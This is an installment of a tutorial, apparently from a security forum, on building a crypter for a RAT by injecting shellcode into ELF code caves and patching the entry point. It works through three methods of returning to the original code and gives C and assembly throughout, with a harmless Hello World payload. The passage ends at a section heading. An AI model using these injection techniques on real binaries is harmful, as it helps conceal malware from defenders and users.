<p>Instead of going with the full stub I will first introduce a very simple one so we can focus on the code injection concept. Why?. Well, this is how I actually did it. The real stuff is a relatively complex program that will have its own bugs, so we better use a program we know it works to get the code injection right and them we go for the big guy. This way, when something doesn’t work we will know it is because the code injection and not the code we are trying to inject.</p>
<p>So, we will go for the very basic <code>Hello World</code> shellcode we wrote earlier in this series. In case you do not remember those old good days, this is the code:</p>
<pre><code class="lang-auto">        global _start
_start:
        mov rax, 1          ; SYS_write = 1
        mov rdi, 1          ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13         ; count = 13 (the number of bytes to write)
        syscall             ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))

        ;;  Exit program
        mov rax, 0x3c  ; SYS_exit = 0x3c
        mov rdi, 0     ; status = 0
        syscall        ; (SYS_exit = rax (0x3c), status = rdi (0))

msg:    db 'Hello World!',0x0a
</code></pre>
<p>Let’s compile it and extract the machine code:</p>
<pre><code>$ nasm -f elf64 -o stub-test.o stub-test.asm
$ readelf -S stub.o | grep -A1 ".text"
  [ 1] .text             PROGBITS         0000000000000000  00000180
       0000000000000031  0000000000000000  AX       0     0     16
$ dd if=stub.o count=$((0x31)) skip=$((0x180)) bs=1 | xxd -i
</code></pre>
<p>A quick explanation for those of you not familiar with <code>bash</code> and <code>dd</code>. First, we have to remember that <code>readelf</code> dumps most values in hexadecimal. So we need to convert the offset (<code>0x180</code>) and the size (<code>0x31</code>) of the <code>.text</code> section of our object file (that effectively contains the code of our little hello world), to decimal in order to ask <code>dd</code> to extract the relevant part of the binary.</p>
<p>You can convert them as you wish. In my case, I used a feature of <code>bash</code> (may not work with other shells) that allows me to use hexadecimal number in the form <code>$((0xAAAA))</code>.</p>
<p>The utility <code>dd</code> is really a very powerful tool, it allows to copy data over block devices or files. Let me explain the flag we had used above:</p>
<ul>
<li>
<code>-if</code> : This allows us to indicate our input file, that is indeed the object file we compiled with nasm.</li>
<li>
<code>count</code> : Indicates how many blocks we want to read from the input file and write to the output file.</li>
<li>
<code>skip</code> : Indicates how many blocks we want to skip from the input file before start reading.</li>
<li>
<code>bs</code> : Allows us to indicate the block size. The default value is <code>512</code> as <code>dd</code> is intended to be used with disks, but we have all our values in bytes, so this is more convenient.</li>
<li>
<code>of</code>: Allows us to specify the file where we want the data dumped. When omitted, <code>dd</code> will dump the data to <code>stdout</code>… which is what we really want, in order to pipe the data into <code>xxd</code>.</li>
</ul>
<p>So, the command above will extract <code>0x31</code> bytes from the file <code>stub.o</code> starting at offset <code>0x180</code>. The <code>xxd -i</code> is just to dump the data in a way that we can easily include in our C code. So, the output of the commands above is:</p>
<pre><code>  0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
  0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21,
  0x0a
</code></pre>
<p>Which is effectively the code of our shellcode. OK, you do not have to trust me… just go and check it out:</p>
<pre><code class="lang-auto">$ objdump -d stub.o

stub.o:     file format elf64-x86-64


Disassembly of section .text:  &lt;--- This is the section we extracted !

0000000000000000 &lt;_start&gt;:
   0:   b8 01 00 00 00          mov    $0x1,%eax
   5:   bf 01 00 00 00          mov    $0x1,%edi
   a:   48 8d 35 13 00 00 00    lea    0x13(%rip),%rsi        # 24 &lt;msg&gt;
  11:   ba 0d 00 00 00          mov    $0xd,%edx
  16:   0f 05                   syscall
  18:   b8 3c 00 00 00          mov    $0x3c,%eax
  1d:   bf 00 00 00 00          mov    $0x0,%edi
  22:   0f 05                   syscall

0000000000000024 &lt;msg&gt;:
  24:   48                      rex.W
  25:   65 6c                   gs insb (%dx),%es:(%rdi)
  27:   6c                      insb   (%dx),%es:(%rdi)
  28:   6f                      outsl  %ds:(%rsi),(%dx)
  29:   20 57 6f                and    %dl,0x6f(%rdi)
  2c:   72 6c                   jb     9a &lt;msg+0x76&gt;
  2e:   64 21 0a                and    %ecx,%fs:(%rdx)
</code></pre>
<p>Great. Before continuing, let’s update our crypter, adding a global variable with the code we have just extracted:</p>
<pre><code class="lang-auto">unsigned char *sc[] = {
      0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
      0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05,
      0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05,
      0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21,
      0x0a
};
int  sc_len = 0x31;
</code></pre>
<p>Now, you see why <code>xxd -i</code> is so convenient.</p>
<p>For the final <code>stub</code>, you can also use this, or … well, we can do better and actually in a way that will make debugging easier. But we will get to this later.</p>
<p>Now is time to get our code injected!.</p>
<h1>
<a name="injecting-code-in-elf-binaries-2" class="anchor" href="https://0x00sec.org#injecting-code-in-elf-binaries-2"></a>Injecting code in ELF binaries</h1>
<p>There are two ways to inject code in an ELF binary… actually it is the same for any other format.</p>
<ul>
<li>We make the binary bigger. As big as needed to fit the code we want to add.</li>
<li>We find a part of the file that is not used and we inject the code there :o</li>
</ul>
<p>The second option is easier to accomplish and it is the first one we are going to try (actually this is what this instalment is about). This technique abuses what is known as code caves.</p>
<p>A code cave is, as you can imagine, a part of the file that is actually not used… normally you will see a lot of zeros.</p>
<p>Take any binary… for instance the crypter from our previous instalment and run:</p>
<pre><code> $ xxd crypter | less
</code></pre>
<p>Scroll down, and eventually you will find a lot of zeros… That is the code cave.</p>
<p>Code caves happens because the memory for the programs is allocated in pages which, for GNU/Linux, usually have a size of 4Kb. It may happen, just by chance that the size of your code is exactly a multiple of 4 Kb and… in that case there is no code cave and you need to create your own room into the binary. That is very unlikely but, what is more common is that the size of the cave may vary from a few bytes to a maximum of <code>PAGE_SIZE - 1</code>.</p>
<p>Yes. That’s the drawback. The code we can inject with this technique is limited in size and, it is even possible that it may not fit for specific binaries. Depending on the malware we are talking about, that may be critical or not.</p>
<p>For instance, if the malware is a virus, using this technique makes it more stealth as the size of the files don’t change, however, such a virus may not be able to infect some files… the ones with small code caves that cannot fit the virus in.</p>
<p>In our current case (a cryper for a RAT) it is not that critical. We can always add some extra code or data trash and get a full page for our stub code because we have the control of the program we want to crypt. Anyway, it is always better to do the things right.</p>
<p>In any case, I hope this helps you understand the classical claim saying that the smaller the malware the better. You cannot fit a PyInstaller binary in a code cave… And same happens with exploits and other hackish stuff.</p>
<p>As I said, there are other options. But let’s get started with this and explore the other later. It will also be easier for you to understand those other techniques once you master this simple one.</p>
<h1>
<a name="finding-code-caves-3" class="anchor" href="https://0x00sec.org#finding-code-caves-3"></a>Finding Code Caves</h1>
<p>So, the first thing we have to do is to find the code cave. We can use the <code>sections</code> to find them, but we will use instead the <em>Program Header Table</em>. Why?, First, it is easier and second, this is a good way to introduce the other main ELF structure the <em>Program Header Table</em>.</p>
<p>As you already know, <code>ELF</code> stands for <code>Executable and Linkable Format</code>. And the format provides structures to support those two operations. To execute a binary, and to link together object files in ELF format. And this is what the two main structures defined by the ELF format does:</p>
<ul>
<li>The section table that we explore in the last instalment, is more useful for linking. It tell us were the data and the code are, so the linker can put together all the <code>.text</code> sections and all the <code>.data</code>sections. <em>There is a lot more about linking but for now, this view should be enough</em>.</li>
<li>The program header table that we will use in a sec is used for the execution. It tell us which memory blocks will be created in order to run the program and also which ones will be filled with the information from the disk. <em>Note that the section table is actually not needed to execute an ELF file</em>.</li>
</ul>
<p>You can list the <em>Program Header Table</em> of any binary using <code>readelf -l</code> and you will usually get something like this:</p>
<pre><code>$ readelf -l crypter-1.0

Elf file type is DYN (Shared object file)
Entry point 0x950
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R      0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000001510 0x0000000000001510  R E    0x200000
  LOAD           0x0000000000001d50 0x0000000000201d50 0x0000000000201d50
                 0x00000000000002c0 0x00000000000002e0  RW     0x200000
  DYNAMIC        0x0000000000001d60 0x0000000000201d60 0x0000000000201d60
                 0x00000000000001f0 0x00000000000001f0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000000254 0x0000000000000254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000001384 0x0000000000001384 0x0000000000001384
                 0x000000000000004c 0x000000000000004c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000001d50 0x0000000000201d50 0x0000000000201d50
                 0x00000000000002b0 0x00000000000002b0  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame
   03     .init_array .fini_array .dynamic .got .data .bss
   04     .dynamic
   05     .note.ABI-tag .note.gnu.build-id
   06     .eh_frame_hdr
   07
   08     .init_array .fini_array .dynamic .got
</code></pre>
<p>We will go into the details of this structure in a while, but what I want you to see now is the code cave. For understanding this, there are two things you need to know.</p>
<ul>
<li>The <code>LOAD</code> type are the memory blocks that will be filled with the data coming from the file. Actually the data located at the offset and size indicated for that entry</li>
<li>The <code>E</code> permission means execution, and that is the block that will contain the code. The <code>W</code> permission means write and those are data segment (where the program can write).</li>
</ul>
<p>Well, usually there are two consecutive <code>LOAD</code> segments one containing the code and the next one containing data… and that is where our code cave will be located. Note that may be more segments for code an data, but in general there are two which are consecutive. (You can change this with a specific linker script, but that is not the normal case).</p>
<p>For the output above (note that in your computer the values may differ), if we dump the data between the end of the first <code>LOAD</code> segment (<code>0x0000 + 0x1510</code>) and the beginning of the next <code>LOAD</code> segment (<code>0x1d50</code>)… guess what you will get?</p>
<pre><code>$  dd if=crypter-1.0 skip=$((0x1510)) count=$((0x1d50-0x1510)) bs=1 | xxd
</code></pre>
<p>Yes… that’s a bunch of zeros… and that empty area is where our code will be injected. For this specific binary, the code cave has a size of <code>0x1d50 - 0x1510 = 2128</code> bytes… which is pretty good, but not a lot… Just a little bit more than 2KB.</p>
<h1>
<a name="getting-to-the-program-header-table-4" class="anchor" href="https://0x00sec.org#getting-to-the-program-header-table-4"></a>Getting to the Program Header Table</h1>
<p>Now that we know what to look for, let’s see how do we get there. As it happened with the section table, the relevant data to find the <em>Program Header Table</em> is in the ELF header. I will include it again here, so you start to get to know each other:</p>
<pre><code class="lang-auto">typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	    e_phoff;		/* Program header table file offset */
  Elf64_Off	    e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;	/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;	/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */ 
} Elf64_Ehdr;
</code></pre>
<p>The relevant fields are:</p>
<pre><code class="lang-auto">  Elf64_Off	    e_phoff;		/* Program header table file offset */
  Elf64_Half	e_phentsize;	/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  
</code></pre>
<p>The <code>e_phoff</code> field is the offset in the file (and also in memory as we have mapped the file with <code>mmap</code>) where the <em>Program Header Table</em> can be found. Usually it is just after the header (at offset 64). The next fields tell us how many entries are in the table and the size of each entry.</p>
<p>Using this information, we can get to the table using a pointer as we did with the section table:</p>
<pre><code class="lang-auto">  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr*) p;
  Elf64_Shdr *sh = (Elf64_Shdr*)(p + elf_hdr-&gt;e_shoff) ;
  
  Elf64_Phdr *ph = (Elf64_Phdr*)(p + elf_hdr-&gt;e_phoff) ; // Poiner to PHT
  
</code></pre>
<p>Now we just need to find the segments we are interested on. For that we need to process the table.</p>
<h1>
<a name="processing-the-program-header-table-5" class="anchor" href="https://0x00sec.org#processing-the-program-header-table-5"></a>Processing the Program Header Table</h1>
<p>Before, unveiling what we need to do in the loop, let’s take a quick look to the Program Header Table entry structure. We can get it from <code>/usr/include/elf.h</code>:</p>
<pre><code class="lang-auto">typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	    p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;

</code></pre>
<p>Again, let me drive you through the relevant fields for our crypter:</p>
<ul>
<li>
<code>p_type</code> is the type of the memory block. The only type we are interested on is <code>PT_LOAD</code>. This actually means that the OS will load the data from the file directly into the memory block associated to this header.</li>
<li>
<code>p_flags</code> contains the permissions of the header. This flags let us know if the segment will contain code (<code>P_X</code> permission) or will contain data (<code>P_W</code> permission).</li>
<li>
<code>p_offset</code> is the offset within the file containing the data that will be loaded into memory for this header…</li>
<li>
<code>p_filesz</code> is the size in the file of this header.</li>
</ul>
<p>And knowing this, we can write a code like this to find the code cave:</p>
<pre><code class="lang-auto">  long ccave = 0;
  int  ccave_size = 0;
  
  for (i = 0; i &lt; elf_hdr-&gt;e_phnum; i++) {
    if (ph[i].p_type == PT_LOAD) {
      if (ccave) {ccave_size = ph[i].p_offset - ccave; break}
      if (ph[i].p_flags &amp; PF_X) ccave = ph[i].p_offset + ph[i].p_filesz;
    }
  }
</code></pre>
<p>The code just processes the <code>LOAD</code> sections. If you do not remember what is that, go two sections back and read again. Then we do the following:</p>
<ul>
<li>If the current segment is executable (contains code) we assume our code cave will start at the end of it (offset + size)</li>
<li>Then, if we have already found the start of the code cave, the next segment we process will give us the size</li>
</ul>
<p><em>NOTE: the code above needs some improvement in order to work in the general case… that is left as an exercise for the reader</em>.</p>
<p>When we leave the loop we know where the code cave is and its size… Time to inject our test stub.</p>
<h1>
<a name="injecting-test-code-6" class="anchor" href="https://0x00sec.org#injecting-test-code-6"></a>Injecting test code</h1>
<p>In order to inject the code we just need to copy our shellcode (remember the one we extracted at the beginning of the article) and patch the entry point that we can find in the header.</p>
<p>The code should look like this:</p>
<pre><code class="lang-auto">  elf_hdr-&gt;e_entry = ccave; // New entry point is at the beginning of cave
  if (ccave_size &gt; sc_len) {
    printf ("Injecting code at %lx\n", ccave);
    for (i = 0; i&lt;sc_len; p[ccave+i]=sc[i],i++);
  }
</code></pre>
<p><em>Note: The code above assumes the binary is PIE (you should check for this before proceed) and then we just need to specify the offset as entry point. For non-PIE we have to provide a proper address whose base we should get from the proper Program Header Table entry.</em></p>
<p>If now we compile the crypter and we run it against other program, whenever we run that program, we will get a nice <em>Hello World</em> message instead of the normal behaviour… We have successfully injected code and modified the program to run our code instead of the original program.</p>
<p>So, we are half done. Now we need to run the original code. Let’s remember the point where we are:</p>
<ul>
<li>Our crypter encrypts the <code>.text</code> and <code>.rodata</code> sections in the binary… so the program cannot be executed as it is in the disk</li>
<li>The crypter has also injected some code and patched the binary to run that code (this is exactly the point where we are)</li>
<li>Our code should decrypt the <code>.text</code> and <code>.rodata</code> sections, and then give control to the original entry point.</li>
</ul>
<p>This requires a modification of our shell code. Instead of exiting the process we have to jump back to the <em>Original Entry Point</em>. There are a few ways to do this:</p>
<ul>
<li>We can add a relative jump at the end of our shell code to the original entry point</li>
<li>We can push the original entry point address in the Stack and execute a <code>RET</code> instruction</li>
<li>We can update the memory at the original entry point to jump to the stub and the make the stub fix jump instruction before returning</li>
</ul>
<p>Let’s start implementing them.</p>
<h1>
<a name="relative-jump-to-oep-7" class="anchor" href="https://0x00sec.org#relative-jump-to-oep-7"></a>Relative jump to OEP</h1>
<p>Our first option is to return control to the original program just jumping back to the original entry point (<code>OEP</code>). This method is straightforward and, as it uses a relative jump it will also work with PIE binaries.</p>
<p>Note that for static and non-PIE binaries, we can just perform an absolute jump directly to the value in the entry point field of the header, but with PIE binaries we do not know the absolute entry point address until the program starts to execute. However, a relative jump will work because the difference between both address is the same, independently of the base address randomised by the operating system when mapping the <code>.text</code> section.</p>
<p>So, the first thing we need to do is to change our shellcode. Let’s remove the <code>exit</code> system call, and substitute it with a relative jump that we will have to patch in our crypter. But let’s go step by step.</p>
<pre><code class="lang-auto">       global _start
_start:
        mov rax, 1    ; SYS_write = 1
        mov rdi, 1    ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13   ; count = 13 (the number of bytes to write)
        syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
to_patch:
        jmp 0x1000

msg:    db 'Hello World!',0x0a

</code></pre>
<p>Simple enough right?. Now we can recompile and generate the new shellcode for this stub as we did at the beginning of this instalment. You already know how to do that, but what we need is to figure out how to change the <code>jmp</code> offset so it ends up in the OEP.</p>
<p>After compiling it… let’s take a look with <code>objdump</code>:</p>
<pre><code class="lang-auto">(...)
0000000000000000 &lt;_start&gt;:
   0:   b8 01 00 00 00          mov    $0x1,%eax
   5:   bf 01 00 00 00          mov    $0x1,%edi
   a:   48 8d 35 0c 00 00 00    lea    0xc(%rip),%rsi        # 1d &lt;msg&gt;
  11:   ba 0d 00 00 00          mov    $0xd,%edx
  16:   0f 05                   syscall

0000000000000018 &lt;to_patch&gt;:
  18:   e9 fc 0f 00 00          jmpq   1019 &lt;msg+0xffc&gt;

000000000000001d &lt;msg&gt;:
(...)
</code></pre>
<p>As you can see, I have added a label just before the <code>jmp</code> so we can easily find out the offset to the <code>jmp</code> parameter without counting bytes :). In this case it will be <code>0x19</code> as the first <code>e9</code> at <code>0x18</code> is the opcode for the <code>jmp</code> instruction.</p>
<p>So, what we have to tell <code>jmp</code> is to jump to the OEP. Let’s use some cool ascii art to understand this:</p>
<pre><code>+-----------+
|           | 0x00    - .text segment 
~           ~ 
|           | OEP  &lt;------------------------+ 
~           ~                               |
|           |                               | DIF = EOT + 0x19 + 4 - EOP
+-----------+ EOT (End of .text segment)    |
| stub      |                               |
| jmp       | EOT + 0x18                    |
| offset    | EOT + 0x19                    |
| next inst | EOT + 0x19 + 4 &lt;--------------+
</code></pre>
<p>So, the value we are looking for is <code>OEP - (EOT + 0x19 + 4)</code> the extra four bytes are needed because relative jumps are calculated from the current value of the <code>RIP</code> that, when executing <code>jmp</code> is already pointing to the next instruction, just after the offset that is 4 bytes.</p>
<p>Let’s update our crypter and check if it works. For this test, you need to comment out the <code>rc4</code> call in the crypter because we do not want the code to be crypted (our current stub won’t decrypt it). Then, add the following lines at the end:</p>
<pre><code class="lang-auto">  Elf64_Addr oep = elf_hdr-&gt;e_entry;
  // Copy shell code and patch entry point
  long val = oep - ccave - 0x19 - 4; 
  *((int*)(p+ccave + 0x19)) = val;
</code></pre>
<p>If you try this the program will work fine, but the original code will end with a segmentation fault. I haven’t investigated what is the actual reason. Actually, what happens in my box is that one of the destructors gets corrupted but the root cause for that I haven’t found yet. Anyway, just storing your registers in the stack before modifying them, and restoring after will make the <code>jmp</code> work fine. That means that one of the registers we use have some value used by the original entry point that we need to preserve. The shellcode will now look like this…</p>
<pre><code class="lang-auto">       global _start
_start:
	    push rdi
		push rsi
		push rdx
		push rax
		
        mov rax, 1    ; SYS_write = 1
        mov rdi, 1    ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13   ; count = 13 (the number of bytes to write)
        syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
		
		pop rax	
		pop rdx
		pop rsi
		pop rdi		
to_patch:
        jmp 0x1000

msg:    db 'Hello World!',0x0a

</code></pre>
<p>Now we need to update the offsets and shellcode in the crypter to make this work.</p>
<p>So far so good. Let’s go for the next case.</p>
<h1>
<a name="returning-to-original-entry-point-8" class="anchor" href="https://0x00sec.org#returning-to-original-entry-point-8"></a>Returning to Original Entry Point</h1>
<p>The second option we proposed was to return to the OEP (<em>Original Entry Point</em>). As we already know, when we execute the instruction <code>RET</code> what we actually do is jump to the address stored at the top of the stack. So we just need to push the address we want to jump to in the stack and just <code>ret</code> whenever we are done with our task.</p>
<p>This use to be that easy before PIE. PIE binaries, or <em>Position Independent Executable</em> are loaded in a random address every time the program is executed, so it is impossible to know, before hand at which absolute address we can find the OEP.</p>
<p>Even when PIE binaries are relatively new, the technique we are going to use is as old as the first stack overflow exploit. Yes, when exploiting a buffer overflow (something that is very difficult nowadays), at some point we need an absolute pointer to the area of our shell code containing our data (usually just the <code>/bin/sh</code> string). So the trick used by many shellcodes was to just do a <code>call</code> to an address a few bytes away, and place the data just after the <code>call</code>… Actually many times you will see a <code>jmp</code> to just before the data area and them a <code>call</code> back to the beginning of the program… It doesn’t matter the result is the same, the data absolute address gets magically in the stack:</p>
<blockquote>
<p>In case you wonder, the difference between this technique and the previous one is that, with this one, we are actually getting the absolute entry point address, while the first one just use an offset but doesn’t know the exact address… Depending what you need to do you may need that value, and this is just a way to get it.</p>
</blockquote>
<pre><code class="lang-auto">my_shellcode0:  jmp get_data
my_shellcode1:  ; The shellcode starts here
                ; Pointer to data is in the stack
				(....)
data:           call my_shellcode1
                db '/bin/sh', 0
</code></pre>
<p>The <code>call</code> at the bottom, will push the address of the next instruction, that in this case is just the address of our data. This way, when we arrive at <code>my_shellcode1</code> an absolute pointer to the data is in the top of the stack ready to call <code>execv</code>. This is a very ingenious trick useful when you do not know your whereabouts in memory… something that use to happen with buffer overflows that has to be run on an unknown address in the stack.</p>
<p>We can use this very same technique to give control back to the OEP. As I said, you can implement this in many different ways. This is just one option.</p>
<pre><code class="lang-auto">	global _start
_start:
	call _start2
_start2:
    sub QWORD [rsp], 0x11223344
	push rdi
	push rsi
	push rdx
	push rax

	mov rax, 1    ; SYS_write = 1
	mov rdi, 1    ; fd = 1
	lea rsi, [rel msg]  ; buf = msg 
	mov rdx, 13   ; count = 13 (the number of bytes to write)
	syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
	pop rax	
	pop rdx
	pop rsi
	pop rdi

	ret
	
msg:	db 'Hello World!',0x0a

</code></pre>
<p>The code is the same than in previous case but instead of a <code>jmp</code> we have a <code>ret</code> at the very end, and the beginning just implements the trick we have just explained:</p>
<pre><code class="lang-auto">          call _start2
_start2:  sub QWORD [rsp], offset 
</code></pre>
<p>The <code>call</code> instruction just jumps to the next instruction located at <code>_start2</code>, at the same time that  adds <code>_start2</code> address to the top of the stack. Then, all we need to do is to substract to the top of the stack (<code>[rsp]</code>) the offset to the OEP, the same way we did with the previous technique.</p>
<p>Our crypter (remember to regenerate the shellcode for the new asm) will then look like this:</p>
<pre><code class="lang-auto">  long val = - (oep - ccave - 0x5) ;
  printf ("Offset : %lx \n", val);
  *((int*)(p+ccave + 0x5 + 4)) = val;
</code></pre>
<p>This is exactly the same we did before, but at a different offset in the shellcode… Not sure how to figure out where those numbers come from… Use <code>objdump</code>.</p>
<pre><code>0000000000000000 &lt;_start&gt;:
   0:   e8 00 00 00 00          callq  5 &lt;_start2&gt;

0000000000000005 &lt;_start2&gt;:
   5:   48 81 2c 24 44 33 22    subq   $0x11223344,(%rsp)
   c:   11
</code></pre>
<p>The value 0x05 is the offset to the <code>subq</code> instruction, and the extra 4 bytes is to get to the inmediate value (<code>0x11223344</code> in this case) that we actually need to patch.</p>
<h1>
<a name="modifying-entry-point-9" class="anchor" href="https://0x00sec.org#modifying-entry-point-9"></a>Modifying entry point</h1>
<p>This is the last technique we are going to present. They may be other options, but I believe that with this three examples you can catch the idea and work your own solutions by yourself from this point on.</p>
<p>The technique of modifying the entry point works as follows:</p>
<ul>
<li>Inject your code in the code cave as usual</li>
<li>Store in a memory place accessible by your stub the opcodes located at the Original Entry Point</li>
<li>Inject a <code>call stub_code</code> instruction in the original entry point</li>
<li>In your stub code, after decrypting the original program, restore the original entry point with the stored opcodes</li>
<li>Adjust the return address</li>
<li>Just <code>ret</code>
</li>
</ul>
<p>Let’s see this a bit more in detail with some example. I will take just the latest version of the crypter we are just developing here, but any program may work, just be aware that the numbers in your box may be different. So, for this program, this is what I found at the original entry point (before running our crypter).</p>
<pre><code>$ objdump -d crypter-1.1 | grep -A5 "&lt;_start&gt;:"
0000000000000900 &lt;_start&gt;:
     900:       31 ed                   xor    %ebp,%ebp
     902:       49 89 d1                mov    %rdx,%r9
     905:       5e                      pop    %rsi
     906:       48 89 e2                mov    %rsp,%rdx
     909:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
</code></pre>
<p>This is the usual <code>_start</code> function used by libC, you should have seen this a few times by now. Any way, the code starts doing some stuff in order to be able to call the <code>main</code> function. What we are gonna do is changing those instructions so, instead of doing this, it will just call our stub. We can do this just writing a <code>call</code> instruction at offset <code>0x900</code> (in the example above)… but that will destroy the original <code>_start</code> function.</p>
<p>To avoid this, we just copy the first 8 bytes (I’ll tell you later why 8) somewhere else so we can restore them when we are done. In this case, we need to store the bytes:</p>
<pre><code>0x31 0xed 0x49 0x89 0xd1 0x5e 0x48 0x89
</code></pre>
<p>And change them for a <code>call to stub</code>. Suppose that our code cave is at <code>0x1928</code> (this is just what I get in my system, in your could be a different value), we need to inject</p>
<pre><code>0000000000000900 &lt;_start&gt;:
     900:       e8 23 10 00 00          callq  1928 &lt;__FRAME_END__+0x4&gt;
</code></pre>
<p>We have to note a few things here:</p>
<ul>
<li>The instruction is 5 bytes long… We could just store 5 bytes instead of 8, but it will be easier to work with 8 bytes as you will see in a sec</li>
<li>The parameter is an offset. In this case we want to jump to address <code>0x1928</code> whose offset from the current position is <code>0x1928 - 0x905 = 0x1023</code>. When the processor executes the <code>call</code> instruction, the instruction pointer is already pointing to the next instruction, that is 5 bytes away from the <code>0x900</code>… 5 bytes is the length of the <code>call</code> instruction.</li>
</ul>
<p>So will all this, we shall be able to modify our crypter to inject our test stub at the Original Entry Point. But first we need to slightly change our stub once again.</p>
<h1>
<a name="a-new-stub-10" class="anchor" href="https://0x00sec.org#a-new-stub-10"></a>A new stub</h1>
<p>The first thing we have to do is to update our stub, that will have to do two things now:</p>
<ul>
<li>First it will have to update the return address</li>
<li>Second it will have to restore the original <code>_start</code> code</li>
</ul>
<p>As we know, when executing <code>call</code>, the address to the next instruction is stored in the stack. That is the address to which we want to return… But in this case we want to return to the same address from which we issued the <code>call</code> … because this second time the code will be different. As we said before, <code>call</code> requires 5 bytes. That means that we just need to substract 5 bytes to the address in the stack.</p>
<p>That is also the address to which we have to write back the original opcodes… which is very convenient.</p>
<p>With all this information, the new stub will look like:</p>
<pre><code class="lang-auto">_start2:
	push rdi
	push rsi
	push rdx
	push rax
	
	mov rax, 1    ; SYS_write = 1
	mov rdi, 1    ; fd = 1
	lea rsi, [rel msg]  ; buf = msg 
	mov rdx, 13   ; count = 13 (the number of bytes to write)
	syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
	
	;; Restore original instruction
	sub QWORD [rsp + 0x20], 5
	mov rax, [rsp + 0x20]
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], rdx

	pop rax	
	pop rdx
	pop rsi
	pop rdi

	ret
	
msg:	db 'Hello World!',0x0a
</code></pre>
<p>All the code is the same than last time, except for the following 4 lines:</p>
<pre><code class="lang-auto">	;; Restore original instruction
	sub QWORD [rsp + 0x20], 5
	mov rax, [rsp + 0x20]
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], rdx

</code></pre>
<p>Some explanation is required. We access the return address after storing several registers in the stack, so we can revert all the changes before returning from our stub. As we have done 4 <code>push</code>es at the beginning of the <code>stub</code>, our return address is now <code>0x20</code> bytes (4 time 0x08) above the current <code>rsp</code> value.</p>
<blockquote>
<p>In principle we want to store the registers before doing anything. We can do the <code>sub</code> at the very beginning, but we have to first push any register we want to modify (<code>rax</code> in this case)… so in any case we will end up indexing on <code>rsp</code> at some point to get the EOP address.</p>
</blockquote>
<p>Now, we just update the return address directly in the stack with the <code>sub</code> instruction, and then we get that value into <code>RAX</code>.</p>
<p>The next two instructions actually restore the code. The crypter will have to patch the value we introduce in <code>RDX</code> so it contains the original 8 bytes at <code>_start</code>. Then we just write it back.</p>
<p>As we have to write 5 bytes, it is more convenient to use this 64 bits instruction and write 8 bytes back that doing a 4 bytes write followed by a 1 byte write. It would do the same, but this looks cleaner. Also the crypter code is simpler.</p>
<h1>
<a name="modifying-the-crypter-11" class="anchor" href="https://0x00sec.org#modifying-the-crypter-11"></a>Modifying the crypter</h1>
